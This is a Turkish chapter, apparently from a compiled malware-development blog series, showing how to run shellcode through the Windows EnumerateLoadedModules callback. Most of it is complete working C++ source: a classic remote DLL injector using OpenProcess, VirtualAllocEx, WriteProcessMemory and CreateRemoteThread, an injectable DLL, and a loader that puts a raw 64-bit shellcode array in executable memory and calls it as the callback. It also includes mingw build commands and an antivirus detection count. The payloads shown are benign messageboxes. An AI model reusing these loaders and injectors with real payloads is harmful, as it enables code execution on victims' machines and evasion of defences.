\newpage
\subsection{38. kötü amaçlı yazılım geliştirme hileleri. EnumerateLoadedModules. C++ örneği.}

﷽

![injection](./images/83/2022-12-21_22-25_1.png){width="80%"}    

Bu yazı, kötü amaçlı yazılım geliştirme hilesi olan: `EnumerateLoadedModules` aracılığıyla shellcode çalıştırma konusundaki kendi araştırmamın sonucudur.     

### yüklenen modülleri listeleme  

`EnumerateLoadedModules` API'si, bir uygulamanın yüklenen modüllerini almak için kullanılabilir. Bu API'yi kullanarak, yüklenen modüllerin listesi hata ayıklama amaçlarıyla, hata işleyici çerçevelerinin geliştirilmesi, çökme dökümleri vb. sırasında dökümlenebilir:     

```cpp
BOOL IMAGEAPI EnumerateLoadedModules(
  [in]           HANDLE                       hProcess,
  [in]           PENUMLOADED_MODULES_CALLBACK EnumLoadedModulesCallback,
  [in, optional] PVOID                        UserContext
);
```

`EnumerateLoadedModules`'ı çağırmak için bir geri çağırma işlevi (callback) işaretçisi sağlamamız gerekir. `EnumerateLoadedModules`, yüklenen modül bilgilerini sağlanan bu işlev aracılığıyla geri çağıracaktır.         

### pratik örnek 1. modülleri yazdırmak  

Örneğin, ilk olarak en basit geri çağırma işlevini oluşturalım:      

```cpp
BOOL CALLBACK PrintModules(
  PSTR ModuleName,
  ULONG ModuleBase,
  ULONG ModuleSize,
  PVOID UserContext) {
    // print the module name.
    printf("%s\n", ModuleName);
    return TRUE;
}
```

Ardından, bu işlevi ikinci argüman olarak kullanın:     

```cpp
EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);
```

Yani, tam kod şu şekilde olacak:    

```cpp
#include <iostream>
#include <windows.h>
#include <dbghelp.h>

#pragma comment (lib, "dbghelp.lib")

// callback function
BOOL CALLBACK PrintModules(
  PSTR ModuleName,
  ULONG ModuleBase,
  ULONG ModuleSize,
  PVOID UserContext) {
    // print the module name.
    printf("%s\n", ModuleName);
    return TRUE;
}

int main(int argc, char *argv[]) {
  // inject a DLL into remote process
  HANDLE ph = GetCurrentProcess();
  // enumerate modules
  printf("\nenumerate modules... \n");
  EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);
  return 0;
}
```

### demo 1  

Hadi ilk örneği aksiyon halinde görelim. `hack.cpp` script'imizi derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-s -ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -ldbghelp
```

![injection](./images/83/2022-12-21_21-48.png){width="80%"}    

Ardından, Windows makinesinde (bizim durumumuzda `Windows 10 x64`) çalıştırın:    

```powershell
.\hack.exe
```

![injection](./images/83/2022-12-21_21-53.png){width="80%"}    

![injection](./images/83/2022-12-21_21-53_1.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel çalıştı!      

### pratik örnek 2. DLL enjekte etme  

Diyelim ki, [klasik DLL enjeksiyon](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html) mantığına sahip bir kötü amaçlı yazılımımız var `hack2.cpp`:      

```cpp
#include <iostream>
#include <windows.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char *argv[]) {
  // inject a DLL into remote process
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));  
  LPVOID rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), 
  PAGE_EXECUTE_READWRITE);

  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
  HANDLE rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

  CloseHandle(ph);
  return 0;
}
```

Ve ardından, bu kodu biraz değiştiriyoruz: önceki geri çağırma işleviyle birlikte `EnumerateLoadedModules` API çağrısını ekliyoruz:      
```cpp
/*
hack2.cpp
DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/12/21/malware-tricks-25.html
*/
#include <iostream>
#include <windows.h>
#include <dbghelp.h>

#pragma comment (lib, "dbghelp.lib")

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// callback function
BOOL CALLBACK PrintModules(
  PSTR ModuleName,
  ULONG ModuleBase,
  ULONG ModuleSize,
  PVOID UserContext) {
    // print the module name.
    printf("%s\n", ModuleName);
    return TRUE;
}

int main(int argc, char *argv[]) {
  // inject a DLL into remote process

  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  LPVOID rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), 
  PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
  HANDLE rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

  // enumerate modules
  printf("\nenumerate modules... \n");
  EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);

  CloseHandle(ph);
  return 0;
}
```

Basitlik adına, her zamanki gibi, benim "kötü" DLL'im sadece `meow` messagebox (`evil.c`):    

```cpp
/*
evil.c
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/12/21/malware-tricks-25.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow from evil.dll!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

### demo 2  

Hadi her şeyi aksiyon halinde görelim tekrar.     

İlk olarak, "kötü" DLL'imizi derleyelim:     

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

![injection](./images/83/2022-12-21_22-02.png){width="80%"}    

Sonraki adımda, DLL enjeksiyon yapan kötü amaçlı yazılımımızı derleyelim:   

```bash
x86_64-w64-mingw32-g++ -O2 hack2.cpp -o hack2.exe \
-I/usr/share/mingw-w64/include/ \
-s -ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -ldbghelp
```

![injection](./images/83/2022-12-21_22-04.png){width="80%"}    

Ve son olarak, bunu hedef makinedeki `mspaint.exe` sürecinde çalıştırın (benim durumumda `Windows 10 x64`):

```powershell
.\hack2.exe <mspaint PID>
```

![injection](./images/83/2022-12-21_22-07.png){width="80%"}    

![injection](./images/83/2022-12-21_22-09.png){width="80%"}    

Gördüğünüz gibi, geri çağırma işlevimiz "kötü" DLL'imizi yazdırdı. Mükemmel!     

### pratik örnek 3. Geri çağırma işlevi aracılığıyla shellcode çalıştırma.  

Bu en ilginç örnek. Görülüyor ki, bu API'deki geri çağırma işlevi kullanılarak shellcode çalıştırılabiliyor:    

```cpp
/*
 * hack3.cpp - run shellcode via EnumerateLoadedModules. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2022/12/21/malware-tricks-25.html
*/
#include <windows.h>
#include <dbghelp.h>

unsigned char my_payload[] =
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

int main(int argc, char* argv[]) {
  LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, my_payload, sizeof(my_payload));
  EnumerateLoadedModules(GetCurrentProcess(), (PENUMLOADED_MODULES_CALLBACK)mem, NULL);
  return 0;
}
```

Eğer uzun zamandır blogumu okuyorsanız, o zaman bir deja vu yaşadığınızı düşünüyorum. Gördüğünüz gibi, bu, shellcode'u [EnumDesktopsA](https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html) ve [EnumChildWindows](https://cocomelonc.github.io/malware/2022/07/13/malware-injection-21.html) aracılığıyla çalıştırmaya benziyor. Tek fark, sadece `dbghelp.h` eklemek. Her zamanki gibi, basitlik için `meow-meow` messagebox payload'unu kullandım:      

```cpp
unsigned char my_payload[] =
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";
```

### demo 3  

Hadi shellcode'un çalışmasını aksiyon halinde görelim. "Kötü amaçlı yazılımımızı" derleyelim:

```bash
x86_64-w64-mingw32-g++ -O2 hack3.cpp -o hack3.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -ldbghelp
```

![injection](./images/83/2022-12-21_22-21.png){width="80%"}    

Ardından, hedef makinede çalıştırın:     

```powershell
.\hack3.exe
```

![injection](./images/83/2022-12-21_22-25.png){width="80%"}    

![injection](./images/83/2022-12-21_22-24.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel çalıştı, beklendiği gibi!      

Şimdi `hack3.exe`'yi VirusTotal'a yükleyelim:     

![injection](./images/83/2022-12-21_22-29.png){width="80%"}    

**Böylece, 71 antivirüs motorunun 20'si dosyamızı kötü amaçlı olarak tespit ediyor.**      

[https://www.virustotal.com/gui/file/6fe8e9fe9593780a620903a33d3fda025946e770781eb997490c109fd95303ed/detection](https://www.virustotal.com/gui/file/6fe8e9fe9593780a620903a33d3fda025946e770781eb997490c109fd95303ed/detection)     

Umarım bu yazı, mavi takım üyelerine bu ilginç teknik hakkında farkındalık kazandırır ve kırmızı takım üyelerinin cephanelerine bir silah ekler.    

[EnumerateLoadedModules](https://learn.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-enumerateloadedmodules)     
[Classic DLL injection](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)    
[Malware dev tricks. Run shellcode via EnumChildWindows](https://cocomelonc.github.io/malware/2022/07/13/malware-injection-21.html)      
[Malware dev tricks. Run shellcode via EnumDesktopsA](https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html)     
[Github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-12-21-malware-tricks-25)       
